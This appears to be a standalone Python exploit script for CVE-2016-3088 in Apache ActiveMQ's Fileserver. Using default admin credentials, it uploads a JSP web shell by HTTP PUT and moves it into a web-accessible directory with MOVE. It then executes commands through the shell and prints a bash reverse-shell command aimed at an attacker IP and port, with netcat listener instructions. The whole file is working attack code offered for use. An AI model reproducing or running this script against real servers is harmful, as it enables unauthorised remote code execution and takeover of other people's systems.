import requests
import sys


def exploit(target, attacker_ip, attacker_port):
    """
    Apache ActiveMQ < 5.14.0 Fileserver RCE exploit (CVE-2016-3088)
    Uploads a JSP web shell via PUT request to the Fileserver API.

    Usage:
        1. Run this script: python3 exploit.py <target_ip> <your_ip> <port>
        2. The script will upload a JSP shell and execute a reverse shell command
        3. Make sure your listener is running: nc -lvnp <port>
    """

    base_url = f"http://{target}:8161"
    creds = ("admin", "admin")

    # JSP web shell that executes system commands
    jsp_shell = """
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>
""".strip()

    print(f"[*] Target: {base_url}")
    print(f"[*] Trying default credentials admin:admin")

    # check if ActiveMQ is running
    try:
        r = requests.get(f"{base_url}/admin/", auth=creds, timeout=10)
        if r.status_code == 200:
            print("[+] ActiveMQ admin panel accessible with default credentials")
        else:
            print(f"[-] Got status code {r.status_code}, might not work")
    except requests.exceptions.ConnectionError:
        print("[-] Cannot connect to target, is ActiveMQ running on port 8161?")
        return
    except requests.exceptions.Timeout:
        print("[-] Connection timed out")
        return

    # upload JSP shell via Fileserver PUT
    shell_name = "cmd.jsp"
    upload_url = f"{base_url}/fileserver/{shell_name}"

    print(f"[*] Uploading web shell to {upload_url}")

    try:
        r = requests.put(upload_url, data=jsp_shell, auth=creds, timeout=10)
        if r.status_code in [200, 201, 204]:
            print(f"[+] Shell uploaded successfully")
        else:
            print(f"[-] Upload returned status {r.status_code}")
            return
    except Exception as e:
        print(f"[-] Upload failed: {e}")
        return

    # move the shell to a web-accessible location
    move_url = f"{base_url}/fileserver/{shell_name}"
    dest = f"/opt/activemq/webapps/api/{shell_name}"

    print(f"[*] Moving shell to {dest}")

    headers = {"Destination": f"file://{dest}"}
    try:
        r = requests.request("MOVE", move_url, headers=headers, auth=creds, timeout=10)
        print(f"[*] MOVE response: {r.status_code}")
    except Exception as e:
        print(f"[-] MOVE failed: {e}")
        return

    # trigger the shell
    exec_url = f"{base_url}/api/{shell_name}"
    test_cmd = "id"

    print(f"[*] Testing shell execution with '{test_cmd}'")

    try:
        r = requests.get(exec_url, params={"cmd": test_cmd}, auth=creds, timeout=10)
        if r.status_code == 200 and r.text.strip():
            print(f"[+] Command output: {r.text.strip()}")
            print(f"[+] Shell is working!")
            print(f"\n[*] To get a reverse shell, run:")
            print(f"    1. Start listener: nc -lvnp {attacker_port}")
            print(f"    2. Execute: curl '{exec_url}?cmd=bash+-i+>%26+/dev/tcp/{attacker_ip}/{attacker_port}+0>%261'")
        else:
            print(f"[-] Shell might not be working, status: {r.status_code}")
    except Exception as e:
        print(f"[-] Error: {e}")


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 exploit.py <target_ip> <your_ip> <port>")
        print("Example: python3 exploit.py 10.10.10.15 10.10.14.5 4444")
        sys.exit(1)

    target = sys.argv[1]
    attacker = sys.argv[2]
    port = int(sys.argv[3])

    exploit(target, attacker, port)
